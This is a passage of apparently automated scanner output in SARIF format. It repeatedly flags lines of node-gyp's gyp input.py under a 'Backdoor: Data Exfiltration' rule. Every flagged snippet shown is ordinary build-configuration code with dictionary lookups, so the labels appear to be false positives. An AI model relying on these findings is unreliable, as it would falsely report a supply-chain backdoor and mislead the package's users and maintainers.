              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2703,
                  "startColumn": 29,
                  "endLine": 2703,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        \"none\",\n        \"windows_driver\",\n    )\n    target_type = target_dict.get(\"type\", None)\n    if target_type not in VALID_TARGET_TYPES:\n        raise GypError(\n            \"Target %s has an invalid target type '%s'.  \"\n",
                    "rendered": {
                      "text": "        \"none\",\n        \"windows_driver\",\n    )\n    target_type = target_dict.get(\"type\", None)\n    if target_type not in VALID_TARGET_TYPES:\n        raise GypError(\n            \"Target %s has an invalid target type '%s'.  \"\n",
                      "markdown": "`        \"none\",\n        \"windows_driver\",\n    )\n    target_type = target_dict.get(\"type\", None)\n    if target_type not in VALID_TARGET_TYPES:\n        raise GypError(\n            \"Target %s has an invalid target type '%s'.  \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2479,
                  "startColumn": 49,
                  "endLine": 2479,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    # Now drop all the abstract ones.\n    configs = target_dict[\"configurations\"]\n    target_dict[\"configurations\"] = {\n        k: v for k, v in configs.items() if not v.get(\"abstract\")\n    }\n\n    # Now that all of the target's configurations have been built, go through\n",
                    "rendered": {
                      "text": "    # Now drop all the abstract ones.\n    configs = target_dict[\"configurations\"]\n    target_dict[\"configurations\"] = {\n        k: v for k, v in configs.items() if not v.get(\"abstract\")\n    }\n\n    # Now that all of the target's configurations have been built, go through\n",
                      "markdown": "`    # Now drop all the abstract ones.\n    configs = target_dict[\"configurations\"]\n    target_dict[\"configurations\"] = {\n        k: v for k, v in configs.items() if not v.get(\"abstract\")\n    }\n\n    # Now that all of the target's configurations have been built, go through\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2451,
                  "startColumn": 33,
                  "endLine": 2451,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    configs = target_dict[\"configurations\"]\n    for (configuration, old_configuration_dict) in configs.items():\n        # Skip abstract configurations (saves work only).\n        if old_configuration_dict.get(\"abstract\"):\n            continue\n        # Configurations inherit (most) settings from the enclosing target scope.\n        # Get the inheritance relationship right by making a copy of the target\n",
                    "rendered": {
                      "text": "    configs = target_dict[\"configurations\"]\n    for (configuration, old_configuration_dict) in configs.items():\n        # Skip abstract configurations (saves work only).\n        if old_configuration_dict.get(\"abstract\"):\n            continue\n        # Configurations inherit (most) settings from the enclosing target scope.\n        # Get the inheritance relationship right by making a copy of the target\n",
                      "markdown": "`    configs = target_dict[\"configurations\"]\n    for (configuration, old_configuration_dict) in configs.items():\n        # Skip abstract configurations (saves work only).\n        if old_configuration_dict.get(\"abstract\"):\n            continue\n        # Configurations inherit (most) settings from the enclosing target scope.\n        # Get the inheritance relationship right by making a copy of the target\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2443,
                  "startColumn": 25,
                  "endLine": 2443,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        concrete = [\n            i\n            for (i, config) in target_dict[\"configurations\"].items()\n            if not config.get(\"abstract\")\n        ]\n        target_dict[\"default_configuration\"] = sorted(concrete)[0]\n\n",
                    "rendered": {
                      "text": "        concrete = [\n            i\n            for (i, config) in target_dict[\"configurations\"].items()\n            if not config.get(\"abstract\")\n        ]\n        target_dict[\"default_configuration\"] = sorted(concrete)[0]\n\n",
                      "markdown": "`        concrete = [\n            i\n            for (i, config) in target_dict[\"configurations\"].items()\n            if not config.get(\"abstract\")\n        ]\n        target_dict[\"default_configuration\"] = sorted(concrete)[0]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2408,
                  "startColumn": 36,
                  "endLine": 2408,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    configuration_dict = target_dict[\"configurations\"][configuration]\n\n    # Merge in parents.\n    for parent in configuration_dict.get(\"inherit_from\", []):\n        MergeConfigWithInheritance(\n            new_configuration_dict,\n            build_file,\n",
                    "rendered": {
                      "text": "    configuration_dict = target_dict[\"configurations\"][configuration]\n\n    # Merge in parents.\n    for parent in configuration_dict.get(\"inherit_from\", []):\n        MergeConfigWithInheritance(\n            new_configuration_dict,\n            build_file,\n",
                      "markdown": "`    configuration_dict = target_dict[\"configurations\"][configuration]\n\n    # Merge in parents.\n    for parent in configuration_dict.get(\"inherit_from\", []):\n        MergeConfigWithInheritance(\n            new_configuration_dict,\n            build_file,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2125,
                  "startColumn": 43,
                  "endLine": 2125,
                  "endColumn": 48,
                  "snippet": {
                    "text": "                # non-static library dependency that isn't a direct dependency.\n                if (\n                    dependency_dict[\"type\"] == \"static_library\"\n                    and not dependency_dict.get(\"hard_dependency\", False)\n                ) or (\n                    dependency_dict[\"type\"] != \"static_library\"\n                    and dependency not in target_dict[\"dependencies\"]\n",
                    "rendered": {
                      "text": "                # non-static library dependency that isn't a direct dependency.\n                if (\n                    dependency_dict[\"type\"] == \"static_library\"\n                    and not dependency_dict.get(\"hard_dependency\", False)\n                ) or (\n                    dependency_dict[\"type\"] != \"static_library\"\n                    and dependency not in target_dict[\"dependencies\"]\n",
                      "markdown": "`                # non-static library dependency that isn't a direct dependency.\n                if (\n                    dependency_dict[\"type\"] == \"static_library\"\n                    and not dependency_dict.get(\"hard_dependency\", False)\n                ) or (\n                    dependency_dict[\"type\"] != \"static_library\"\n                    and dependency not in target_dict[\"dependencies\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2101,
                  "startColumn": 62,
                  "endLine": 2101,
                  "endColumn": 67,
                  "snippet": {
                    "text": "            if \"dependencies\" not in target_dict:\n                continue\n\n            target_dict[\"dependencies_original\"] = target_dict.get(\"dependencies\", [])[\n                :\n            ]\n\n",
                    "rendered": {
                      "text": "            if \"dependencies\" not in target_dict:\n                continue\n\n            target_dict[\"dependencies_original\"] = target_dict.get(\"dependencies\", [])[\n                :\n            ]\n\n",
                      "markdown": "`            if \"dependencies\" not in target_dict:\n                continue\n\n            target_dict[\"dependencies_original\"] = target_dict.get(\"dependencies\", [])[\n                :\n            ]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2018,
                  "startColumn": 46,
                  "endLine": 2018,
                  "endColumn": 51,
                  "snippet": {
                    "text": "            if dependency_build_file == build_file:\n                # A .gyp file is allowed to refer back to itself.\n                continue\n            dependency_node = dependency_nodes.get(dependency_build_file)\n            if not dependency_node:\n                raise GypError(\"Dependency '%s' not found\" % dependency_build_file)\n            if dependency_node not in build_file_node.dependencies:\n",
                    "rendered": {
                      "text": "            if dependency_build_file == build_file:\n                # A .gyp file is allowed to refer back to itself.\n                continue\n            dependency_node = dependency_nodes.get(dependency_build_file)\n            if not dependency_node:\n                raise GypError(\"Dependency '%s' not found\" % dependency_build_file)\n            if dependency_node not in build_file_node.dependencies:\n",
                      "markdown": "`            if dependency_build_file == build_file:\n                # A .gyp file is allowed to refer back to itself.\n                continue\n            dependency_node = dependency_nodes.get(dependency_build_file)\n            if not dependency_node:\n                raise GypError(\"Dependency '%s' not found\" % dependency_build_file)\n            if dependency_node not in build_file_node.dependencies:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2005,
                  "startColumn": 34,
                  "endLine": 2005,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    for target, spec in targets.items():\n        build_file = gyp.common.BuildFile(target)\n        build_file_node = dependency_nodes[build_file]\n        target_dependencies = spec.get(\"dependencies\", [])\n        for dependency in target_dependencies:\n            try:\n                dependency_build_file = gyp.common.BuildFile(dependency)\n",
                    "rendered": {
                      "text": "    for target, spec in targets.items():\n        build_file = gyp.common.BuildFile(target)\n        build_file_node = dependency_nodes[build_file]\n        target_dependencies = spec.get(\"dependencies\", [])\n        for dependency in target_dependencies:\n            try:\n                dependency_build_file = gyp.common.BuildFile(dependency)\n",
                      "markdown": "`    for target, spec in targets.items():\n        build_file = gyp.common.BuildFile(target)\n        build_file_node = dependency_nodes[build_file]\n        target_dependencies = spec.get(\"dependencies\", [])\n        for dependency in target_dependencies:\n            try:\n                dependency_build_file = gyp.common.BuildFile(dependency)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1959,
                  "startColumn": 50,
                  "endLine": 1959,
                  "endColumn": 55,
                  "snippet": {
                    "text": "            root_node.dependents.append(target_node)\n        else:\n            for dependency in dependencies:\n                dependency_node = dependency_nodes.get(dependency)\n                if not dependency_node:\n                    raise GypError(\n                        \"Dependency '%s' not found while \"\n",
                    "rendered": {
                      "text": "            root_node.dependents.append(target_node)\n        else:\n            for dependency in dependencies:\n                dependency_node = dependency_nodes.get(dependency)\n                if not dependency_node:\n                    raise GypError(\n                        \"Dependency '%s' not found while \"\n",
                      "markdown": "`            root_node.dependents.append(target_node)\n        else:\n            for dependency in dependencies:\n                dependency_node = dependency_nodes.get(dependency)\n                if not dependency_node:\n                    raise GypError(\n                        \"Dependency '%s' not found while \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1953,
                  "startColumn": 27,
                  "endLine": 1953,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    root_node = DependencyGraphNode(None)\n    for target, spec in targets.items():\n        target_node = dependency_nodes[target]\n        dependencies = spec.get(\"dependencies\")\n        if not dependencies:\n            target_node.dependencies = [root_node]\n            root_node.dependents.append(target_node)\n",
                    "rendered": {
                      "text": "    root_node = DependencyGraphNode(None)\n    for target, spec in targets.items():\n        target_node = dependency_nodes[target]\n        dependencies = spec.get(\"dependencies\")\n        if not dependencies:\n            target_node.dependencies = [root_node]\n            root_node.dependents.append(target_node)\n",
                      "markdown": "`    root_node = DependencyGraphNode(None)\n    for target, spec in targets.items():\n        target_node = dependency_nodes[target]\n        dependencies = spec.get(\"dependencies\")\n        if not dependencies:\n            target_node.dependencies = [root_node]\n            root_node.dependents.append(target_node)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1928,
                  "startColumn": 52,
                  "endLine": 1928,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        # link_settings are propagated.  So for now, we will allow it, unless the\n        # 'allow_sharedlib_linksettings_propagation' flag is explicitly set to\n        # False.  Once chrome is fixed, we can remove this flag.\n        include_shared_libraries = targets[self.ref].get(\n            \"allow_sharedlib_linksettings_propagation\", True\n        )\n        return self._LinkDependenciesInternal(targets, include_shared_libraries)\n",
                    "rendered": {
                      "text": "        # link_settings are propagated.  So for now, we will allow it, unless the\n        # 'allow_sharedlib_linksettings_propagation' flag is explicitly set to\n        # False.  Once chrome is fixed, we can remove this flag.\n        include_shared_libraries = targets[self.ref].get(\n            \"allow_sharedlib_linksettings_propagation\", True\n        )\n        return self._LinkDependenciesInternal(targets, include_shared_libraries)\n",
                      "markdown": "`        # link_settings are propagated.  So for now, we will allow it, unless the\n        # 'allow_sharedlib_linksettings_propagation' flag is explicitly set to\n        # False.  Once chrome is fixed, we can remove this flag.\n        include_shared_libraries = targets[self.ref].get(\n            \"allow_sharedlib_linksettings_propagation\", True\n        )\n        return self._LinkDependenciesInternal(targets, include_shared_libraries)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1872,
                  "startColumn": 58,
                  "endLine": 1872,
                  "endColumn": 63,
                  "snippet": {
                    "text": "            return dependencies\n\n        # Don't traverse 'none' targets if explicitly excluded.\n        if target_type == \"none\" and not targets[self.ref].get(\n            \"dependencies_traverse\", True\n        ):\n            dependencies.add(self.ref)\n",
                    "rendered": {
                      "text": "            return dependencies\n\n        # Don't traverse 'none' targets if explicitly excluded.\n        if target_type == \"none\" and not targets[self.ref].get(\n            \"dependencies_traverse\", True\n        ):\n            dependencies.add(self.ref)\n",
                      "markdown": "`            return dependencies\n\n        # Don't traverse 'none' targets if explicitly excluded.\n        if target_type == \"none\" and not targets[self.ref].get(\n            \"dependencies_traverse\", True\n        ):\n            dependencies.add(self.ref)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1786,
                  "startColumn": 54,
                  "endLine": 1786,
                  "endColumn": 59,
                  "snippet": {
                    "text": "            # dependency that exported them.  This is done to more closely match\n            # the depth-first method used by DeepDependencies.\n            add_index = 1\n            for imported_dependency in dependency_dict.get(\n                \"export_dependent_settings\", []\n            ):\n                if imported_dependency not in dependencies:\n",
                    "rendered": {
                      "text": "            # dependency that exported them.  This is done to more closely match\n            # the depth-first method used by DeepDependencies.\n            add_index = 1\n            for imported_dependency in dependency_dict.get(\n                \"export_dependent_settings\", []\n            ):\n                if imported_dependency not in dependencies:\n",
                      "markdown": "`            # dependency that exported them.  This is done to more closely match\n            # the depth-first method used by DeepDependencies.\n            add_index = 1\n            for imported_dependency in dependency_dict.get(\n                \"export_dependent_settings\", []\n            ):\n                if imported_dependency not in dependencies:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1645,
                  "startColumn": 58,
                  "endLine": 1645,
                  "endColumn": 63,
                  "snippet": {
                    "text": "            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n                        if targets[t].get(\"variables\", {}).get(\"link_dependency\", 0):\n                            target_dict[dependency_key] = Filter(\n                                target_dict[dependency_key], t\n                            )\n",
                    "rendered": {
                      "text": "            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n                        if targets[t].get(\"variables\", {}).get(\"link_dependency\", 0):\n                            target_dict[dependency_key] = Filter(\n                                target_dict[dependency_key], t\n                            )\n",
                      "markdown": "`            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n                        if targets[t].get(\"variables\", {}).get(\"link_dependency\", 0):\n                            target_dict[dependency_key] = Filter(\n                                target_dict[dependency_key], t\n                            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1645,
                  "startColumn": 37,
                  "endLine": 1645,
                  "endColumn": 42,
                  "snippet": {
                    "text": "            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n                        if targets[t].get(\"variables\", {}).get(\"link_dependency\", 0):\n                            target_dict[dependency_key] = Filter(\n                                target_dict[dependency_key], t\n                            )\n",
                    "rendered": {
                      "text": "            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n                        if targets[t].get(\"variables\", {}).get(\"link_dependency\", 0):\n                            target_dict[dependency_key] = Filter(\n                                target_dict[dependency_key], t\n                            )\n",
                      "markdown": "`            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n                        if targets[t].get(\"variables\", {}).get(\"link_dependency\", 0):\n                            target_dict[dependency_key] = Filter(\n                                target_dict[dependency_key], t\n                            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1644,
                  "startColumn": 34,
                  "endLine": 1644,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n                        if targets[t].get(\"variables\", {}).get(\"link_dependency\", 0):\n                            target_dict[dependency_key] = Filter(\n                                target_dict[dependency_key], t\n",
                    "rendered": {
                      "text": "            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n                        if targets[t].get(\"variables\", {}).get(\"link_dependency\", 0):\n                            target_dict[dependency_key] = Filter(\n                                target_dict[dependency_key], t\n",
                      "markdown": "`            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n                        if targets[t].get(\"variables\", {}).get(\"link_dependency\", 0):\n                            target_dict[dependency_key] = Filter(\n                                target_dict[dependency_key], t\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1641,
                  "startColumn": 38,
                  "endLine": 1641,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  targets.\"\"\"\n    for target_name, target_dict in targets.items():\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n",
                    "rendered": {
                      "text": "  targets.\"\"\"\n    for target_name, target_dict in targets.items():\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n",
                      "markdown": "`  targets.\"\"\"\n    for target_name, target_dict in targets.items():\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                for t in dependencies:\n                    if target_dict.get(\"type\", None) == \"none\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1629,
                  "startColumn": 24,
                  "endLine": 1629,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                    if t == target_name and (\n                        targets[t]\n                        .get(\"variables\", {})\n                        .get(\"prune_self_dependency\", 0)\n                    ):\n                        target_dict[dependency_key] = Filter(\n                            dependencies, target_name\n",
                    "rendered": {
                      "text": "                    if t == target_name and (\n                        targets[t]\n                        .get(\"variables\", {})\n                        .get(\"prune_self_dependency\", 0)\n                    ):\n                        target_dict[dependency_key] = Filter(\n                            dependencies, target_name\n",
                      "markdown": "`                    if t == target_name and (\n                        targets[t]\n                        .get(\"variables\", {})\n                        .get(\"prune_self_dependency\", 0)\n                    ):\n                        target_dict[dependency_key] = Filter(\n                            dependencies, target_name\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1628,
                  "startColumn": 24,
                  "endLine": 1628,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                for t in dependencies:\n                    if t == target_name and (\n                        targets[t]\n                        .get(\"variables\", {})\n                        .get(\"prune_self_dependency\", 0)\n                    ):\n                        target_dict[dependency_key] = Filter(\n",
                    "rendered": {
                      "text": "                for t in dependencies:\n                    if t == target_name and (\n                        targets[t]\n                        .get(\"variables\", {})\n                        .get(\"prune_self_dependency\", 0)\n                    ):\n                        target_dict[dependency_key] = Filter(\n",
                      "markdown": "`                for t in dependencies:\n                    if t == target_name and (\n                        targets[t]\n                        .get(\"variables\", {})\n                        .get(\"prune_self_dependency\", 0)\n                    ):\n                        target_dict[dependency_key] = Filter(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1623,
                  "startColumn": 38,
                  "endLine": 1623,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  variable set.\"\"\"\n    for target_name, target_dict in targets.items():\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                for t in dependencies:\n                    if t == target_name and (\n",
                    "rendered": {
                      "text": "  variable set.\"\"\"\n    for target_name, target_dict in targets.items():\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                for t in dependencies:\n                    if t == target_name and (\n",
                      "markdown": "`  variable set.\"\"\"\n    for target_name, target_dict in targets.items():\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                for t in dependencies:\n                    if t == target_name and (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1607,
                  "startColumn": 38,
                  "endLine": 1607,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  lists.\"\"\"\n    for target_name, target_dict in targets.items():\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                target_dict[dependency_key] = Unify(dependencies)\n\n",
                    "rendered": {
                      "text": "  lists.\"\"\"\n    for target_name, target_dict in targets.items():\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                target_dict[dependency_key] = Unify(dependencies)\n\n",
                      "markdown": "`  lists.\"\"\"\n    for target_name, target_dict in targets.items():\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            if dependencies:\n                target_dict[dependency_key] = Unify(dependencies)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1573,
                  "startColumn": 49,
                  "endLine": 1573,
                  "endColumn": 54,
                  "snippet": {
